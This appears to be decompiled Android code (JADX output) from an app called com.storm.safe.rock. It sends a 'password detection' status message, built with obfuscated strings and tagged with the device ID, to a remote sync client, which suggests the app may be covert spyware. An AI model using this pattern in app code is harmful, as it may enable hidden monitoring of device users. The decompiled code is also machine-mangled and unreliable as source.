package com.storm.safe.rock.service.modules;

import com.storm.safe.rock.network.C0267a0;
import com.storm.safe.rock.util.StringUtil;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import org.json.JSONObject;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.NetworkManager$sendAutoPasswordDetectionStatus$1", m214403f = "NetworkManager.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class NetworkManager$sendAutoPasswordDetectionStatus$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ C0323a8 f52842a1;

    /* renamed from: a2 */
    public final /* synthetic */ boolean f52843a2;

    /* renamed from: a3 */
    public final /* synthetic */ long f52844a3;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public NetworkManager$sendAutoPasswordDetectionStatus$1(C0323a8 c0323a8, boolean z, long j, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52842a1 = c0323a8;
        this.f52843a2 = z;
        this.f52844a3 = j;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new NetworkManager$sendAutoPasswordDetectionStatus$1(this.f52842a1, this.f52843a2, this.f52844a3, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        NetworkManager$sendAutoPasswordDetectionStatus$1 networkManager$sendAutoPasswordDetectionStatus$1 = (NetworkManager$sendAutoPasswordDetectionStatus$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        networkManager$sendAutoPasswordDetectionStatus$1.invokeSuspend(c1351vv);
        return c1351vv;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        if (this.f52842a1.f53103a3 && this.f52842a1.f53102a2 != null) {
            JSONObject jSONObject = new JSONObject();
            boolean z = this.f52843a2;
            long j = this.f52844a3;
            C0323a8 c0323a8 = this.f52842a1;
            jSONObject.put("type", StringUtil.m212470a0("KkwFNXIoDT1EJiRLFQVJPRgrVCUiVh8FXiwNOkIi"));
            jSONObject.put("enabled", z);
            jSONObject.put("delayMs", j);
            jSONObject.put("deviceId", c0323a8.f53107a7);
            C0267a0 c0267a0 = this.f52842a1.f53102a2;
            if (c0267a0 == null) {
                t60.m214724f2("dataSyncClient");
                throw null;
            }
            c0267a0.m211369b0(jSONObject);
        }
        return C1351vv.f60710b1;
    }
}
